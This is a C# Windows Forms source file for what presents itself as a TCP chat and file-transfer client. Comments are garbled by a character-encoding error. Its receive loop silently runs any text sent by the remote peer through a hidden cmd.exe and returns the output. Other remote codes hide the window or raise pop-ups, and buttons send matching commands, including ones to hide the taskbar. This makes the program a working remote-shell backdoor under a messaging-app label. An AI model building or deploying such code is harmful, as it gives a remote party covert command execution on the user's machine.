using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Runtime.InteropServices;


namespace TCPMessageClient
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        //�����������ʱ���ã�
        [DllImport("user32.dll")]
        static extern void keybd_event
        (
            byte bVk,// �����ֵ  
            byte bScan,// Ӳ��ɨ����  
            uint dwFlags,// ������ʶ  
            IntPtr dwExtraInfo// ����̶��������ĸ�����Ϣ  
        );

        //Socket����
        Socket socket;
        Dictionary<string, Socket> dictionary = new Dictionary<string, Socket>();

        private void Form1_Load(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false; //ȡ�����̼߳�飬��ֹ����
            ipText.Text = "192.168.3.34"; //��ʼ��Ĭ��IP��ַ
            portText.Text = "7010";
        }

        private void button1_Click(object sender, EventArgs e) //����
        {
            try
            {
                //��������ͨ�ŵ�socket
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //��ַ���˿�
                IPAddress ip = IPAddress.Parse(ipText.Text);
                int serverPort = Convert.ToInt32(portText.Text);
                IPEndPoint port = new IPEndPoint(ip, serverPort);
                //���ӵ�������
                socket.Connect(port);
                ShowLog("������");
                //�������������߳�
                Thread th = new Thread(receive);
                th.IsBackground = true;
                th.Start();
            }
            catch { }
        }

        private void ShowLog(string str) //д����־
        {
            textLog.AppendText(str + "\r\n");
        }

        /// <summary>
        /// ����Ϣ
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        /// 

        //������Ϣ
        private void button3_Click(object sender, EventArgs e) //������Ϣ
        {
            try
            {
                string txt = sendMsg.Text;
                byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
                List<byte> list = new List<byte>();
                list.Add(0); // 0Ϊ����Ϣ
                list.AddRange(buffer);
                byte[] newBuffer = list.ToArray();
                //socket.Send(buffer);
                //string ip1 = ipText.Text + ":" + portText.Text;
                //MessageBox.Show(ip1);
                //Socket socket = dictionary[ip1];
                socket.Send(newBuffer);
                sendMsg.Text = "";
                ShowLog("Local" + ":\r\t" + txt);
            }
            catch { }
        }

        private void receive() //������Ϣ
        {
            while (true)
            {
                try
                {
                    byte[] buffer = new byte[1024 * 1024 * 20];
                    int length = socket.Receive(buffer);
                    if (length == 0)
                    {
                        break;
                    }
                    if (buffer[0] == 0) //������Ϣ
                    {
                        string txt = Encoding.UTF8.GetString(buffer, 1, length - 1);//must use utf8 to encode
                        //string txt = sendMsg.Text;
                        ShowLog(socket.RemoteEndPoint + ":\r\t" + txt);
                        ReceivedFilenameTxt.Text = txt;

                       
                    }
                    else if (buffer[0] == 1) //�����ļ�
                    {
                        SaveFileDialog saveFileDialog = new SaveFileDialog();
                        saveFileDialog.InitialDirectory = @"E:\";
                        saveFileDialog.Title = "ѡ���ļ�λ��";
                        saveFileDialog.Filter = "�����ļ� | *.*";
                        saveFileDialog.FileName = ReceivedFilenameTxt.Text;
                        //saveFileDialog.FileName = "*" + System.IO.Path.GetExtension("123.docx");
                        //saveFileDialog.FileName
                        saveFileDialog.ShowDialog(this);
                        string path = saveFileDialog.FileName;
                        FileStream fileStreamWrite = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
                        fileStreamWrite.Write(buffer, 1, length - 1);
                        fileStreamWrite.Close();
                        ShowLog("Local:" + "\n\t" + "�ļ��������");
                        //MessageBox.Show("����ɹ�");
                        ReceivedFilenameTxt.Text = "";
                    }
                    else if (buffer[0] == 2) //���ڶ���
                    {
                        notifyIcon1_MouseDoubleClick(null,null); //����ʾ���ڣ����򲻻ᶶ��
                        ZD(); //���ڶ�������
                    }

                    else if (buffer[0] == 3) //ִ������
                    //bug: ����ȴ�һ������ִ�н�������ִ����һ��������ô򿪳���������ý�����������
                    {
                        string txt = Encoding.UTF8.GetString(buffer, 1, length - 1);
                        ShowLog(socket.RemoteEndPoint + ":\r\t׼��ִ������" + txt);
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c" + txt;
                        process.StartInfo.UseShellExecute = false;   //�Ƿ�ʹ�ò���ϵͳshell���� 
                        process.StartInfo.CreateNoWindow = true;   //�Ƿ����´����������ý��̵�ֵ (����ʾ���򴰿�)
                        process.StartInfo.UseShellExecute = false;       //�Ƿ�����shell��������  
                        process.StartInfo.RedirectStandardInput = true;  // �ض�������    
                        process.StartInfo.RedirectStandardOutput = true; // �ض����׼���    
                        process.StartInfo.RedirectStandardError = true;  // �ض���������  
                        process.Start();
                        sendMsg.Text = process.StandardOutput.ReadToEnd();//���
                        button3_Click(null, null);
                        //process.WaitForExit();  //�ȴ�����ִ�����˳�����
                        process.Close();
                    }

                    else if (buffer[0] == 4) //���𵯴�
                    {
                        string txt = Encoding.UTF8.GetString(buffer, 1, length - 1);//must use utf8 to encode
                        ShowLog(socket.RemoteEndPoint + ":\r\t" + "׼�����𵯴�" + txt);
                        MessageBox.Show(txt);
                    }

                    else if (buffer[0] == 6) //���ر��ش���
                    {
                        string txt = Encoding.UTF8.GetString(buffer, 1, length - 1);//must use utf8 to encode
                        this.Hide();
                    }

                    /*
                    else if (buffer[0] == 7)//��������ָ����server����ʱ���ã�
                    {
                        string txt = Encoding.UTF8.GetString(buffer, 1, length - 1);//must use utf8 to encode
                        ipText.Text = txt;
                        button1_Click(null,null);
                    }
                    */
                }
                catch { }
                
            }
        }

        //���ڶ���
        private void ZD()
        {
            for (int i = 0; i < 20; i++)
            {
                if (i % 2 == 0)
                {
                    this.Location = new System.Drawing.Point(500, 500);
                }
                else
                {
                    this.Location = new System.Drawing.Point(530, 530);
                }
                Thread.Sleep(20);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                socket.Disconnect(false);
            }
        }


        private void textLog_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click_1(object sender, EventArgs e) //���ر��ش���
        {
            this.Hide();
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e) //���½�ͼ��˫���򿪴���
        {
            this.Show();
            //this.Visible = true;
            //this.WindowState = FormWindowState.Normal;
        }

        private void button4_Click(object sender, EventArgs e) //ѡ���ļ��������ļ���
        {
            OpenFileDialog fileDialog = new OpenFileDialog();
            fileDialog.InitialDirectory = @"E:";
            fileDialog.Title = "ѡ���ļ�";
            fileDialog.Filter = "�����ļ�|*.*";
            fileDialog.ShowDialog();

            pathTxt.Text = fileDialog.FileName;

            FilenameTxt.Text = fileDialog.SafeFileName;
            string txt = FilenameTxt.Text;
            ShowLog("Local" + ":׼�������ļ�\r\t" + txt);
            byte[] buffer = Encoding.UTF8.GetBytes(txt);
            List<byte> list = new List<byte>();
            list.Add(0); // 0 Ϊ ����Ϣ
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            socket.Send(newBuffer);

        }

        private void sendfileBtn_Click(object sender, EventArgs e) //�����ļ�
        {
            string path = pathTxt.Text;
            FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);

            byte[] buffer = new byte[1024 * 1024 * 20]; //�ļ���СnMB=1024*1024*n
            buffer[0] = 1;// 1 Ϊ���ļ��ı�־λ
            int length = fileStream.Read(buffer, 1, buffer.Length - 1);
            fileStream.Close();
            socket.Send(buffer, 0, length + 1, SocketFlags.None);
            ShowLog("Local:" + "\n\t" + "�ļ��������");
            pathTxt.Text = "";
            FilenameTxt.Text = "";
        }

        private void button4_Click_1(object sender, EventArgs e) //��Server���ͽ�������
        {
            try
            {
                string txt = "׼������";
                byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
                List<byte> list = new List<byte>();
                list.Add(10); //10Ϊ����
                list.AddRange(buffer);
                byte[] newBuffer = list.ToArray();
                //socket.Send(buffer);
                //string ip1 = ipText.Text + ":" + portText.Text;
                //MessageBox.Show(ip1);
                //Socket socket = dictionary[ip1];
                socket.Send(newBuffer);
                sendMsg.Text = "";
                ShowLog("Local" + ":\r\t" + txt);
            }
            catch { }
        }

        //�ر�ǰ�ص�socket
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            socket.Disconnect(false);
            socket.Close();
        }

        private void cmdBtn_Click(object sender, EventArgs e)
        {
            try
            {
                string txt = sendMsg.Text;
                byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
                List<byte> list = new List<byte>();
                list.Add(3); // 3Ϊִ������
                list.AddRange(buffer);
                byte[] newBuffer = list.ToArray();
                //socket.Send(buffer);
                //string ip1 = ipText.Text + ":" + portText.Text;
                //MessageBox.Show(ip1);
                //Socket socket = dictionary[ip1];
                socket.Send(newBuffer);
                sendMsg.Text = "";
                ShowLog("Local" + ":\r\t" + "׼��ִ������" + txt);
            }
            catch { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            string txt = sendMsg.Text;
            byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
            List<byte> list = new List<byte>();
            list.Add(4); // 4Ϊ���͵���
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            //socket.Send(buffer);
            //string ip1 = ipText.Text + ":" + portText.Text;
            //MessageBox.Show(ip1);
            //Socket socket = dictionary[ip1];
            socket.Send(newBuffer);
            sendMsg.Text = "";
            ShowLog("Local" + ":\r\t" + "׼�����͵���" + txt);

        }

        private void button7_Click(object sender, EventArgs e)
        {
            string txt = "���ڶ���";
            byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
            List<byte> list = new List<byte>();
            list.Add(2); // 2Ϊ���ڶ���
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            //socket.Send(buffer);
            //string ip1 = ipText.Text + ":" + portText.Text;
            //MessageBox.Show(ip1);
            //Socket socket = dictionary[ip1];
            socket.Send(newBuffer);
            sendMsg.Text = "";
            ShowLog("Local" + ":\r\t" + "���ʹ��ڶ���");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            string txt = "���ش���";
            byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
            List<byte> list = new List<byte>();
            list.Add(6); // 6Ϊ���ش���
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            //socket.Send(buffer);
            //string ip1 = ipText.Text + ":" + portText.Text;
            //MessageBox.Show(ip1);
            //Socket socket = dictionary[ip1];
            socket.Send(newBuffer);
            sendMsg.Text = "";
            ShowLog("Local" + ":\r\t" + "����Server����");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string txt = "����������ͼ��";
            byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
            List<byte> list = new List<byte>();
            list.Add(12); // 12Ϊ����������ͼ��
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            //socket.Send(buffer);
            //string ip1 = ipText.Text + ":" + portText.Text;
            //MessageBox.Show(ip1);
            //Socket socket = dictionary[ip1];
            socket.Send(newBuffer);
            sendMsg.Text = "";
            ShowLog("Local" + ":\r\t" + txt);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            string txt = "��ʾ������ͼ��";
            byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
            List<byte> list = new List<byte>();
            list.Add(13); // 13Ϊ��ʾ������ͼ��
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            //socket.Send(buffer);
            //string ip1 = ipText.Text + ":" + portText.Text;
            //MessageBox.Show(ip1);
            //Socket socket = dictionary[ip1];
            socket.Send(newBuffer);
            sendMsg.Text = "";
            ShowLog("Local" + ":\r\t" + txt);
        }

        private void button10_Click(object sender, EventArgs e) //����
        {
            try
            {
                string txt = sendMsg.Text;
                byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
                List<byte> list = new List<byte>();
                list.Add(14); // 14Ϊ����
                list.AddRange(buffer);
                byte[] newBuffer = list.ToArray();
                //socket.Send(buffer);
                //string ip1 = ipText.Text + ":" + portText.Text;
                //MessageBox.Show(ip1);
                //Socket socket = dictionary[ip1];
                socket.Send(newBuffer);
                sendMsg.Text = "";
                ShowLog("Local" + ":\r\t����" + txt);
            }
            catch { }

        }

        private void button11_Click(object sender, EventArgs e) //Keycode��ʾ
        {
            MessageBox.Show("1 ������ 2 ����Ҽ� 3 Cancel 4 ����м� 8 Backspace 9 Tab 12 Clear 13 Enter 16 Shift 17 Ctrl 18 Alt 19 Pause 20 Caps Lock 27 Esc 32 Space 33 Page Up 34 Page Down 35 End 36 Home 37 Left Arrow 38 Up Arrow 39 Right Arrow 40 Down Arrow 41 Select 42 Print 43 Execute 44 Snapshot 45 Insert 46 Delete 47 Help 48 0 49 1 50 2 51 3 52 4 53 5 54 6 55 7 56 8 57 9 65 A 66 B 67 C 68 D 69 E 70 F 71 G 72 H 73 I 74 J 75 K 76 L 77 M 78 N 79 O 80 P 81 Q 82 R 83 S 84 T 85 U 86 V 87 W 88 X 89 Y 90 Z 96 С���� 0 97 С���� 1 98 С���� 2 99 С���� 3 100 С���� 4 101 С���� 5 102 С���� 6 103 С���� 7 104 С���� 8 105 С���� 9 106 С���� * 107 С���� + 108 С���� Enter 109 С���� - 110 С���� . 111 С���� / 112 F1 113 F2 114 F3 115 F4 116 F5 117 F6 118 F7 119 F8 120 F9 121 F10 122 F11 123 F12 144 Num Lock 145 Scroll 173 VolumeMute 174 VolumeDown 175 VolumeUp 186 ; : 187 = + 188  189 - _ 190  191 / ? 192 ` ~ 219 [ { 220 | 221 ] } 222 ' ");
        }

        private void button12_Click(object sender, EventArgs e)
        {
            /*
            string txt = "���ش���";
            byte[] buffer = Encoding.UTF8.GetBytes(txt);//must use utf8 to encode
            List<byte> list = new List<byte>();
            list.Add(15); // 15Ϊ��ʾ���ڣ���������
            list.AddRange(buffer);
            byte[] newBuffer = list.ToArray();
            //socket.Send(buffer);
            //string ip1 = ipText.Text + ":" + portText.Text;
            //MessageBox.Show(ip1);
            //Socket socket = dictionary[ip1];
            socket.Send(newBuffer);
            sendMsg.Text = "";
            ShowLog("Local" + ":\r\t" + "��ʾServer����");
            */
            MessageBox.Show("Invalid Action! The function is under development.");
        }
    }
}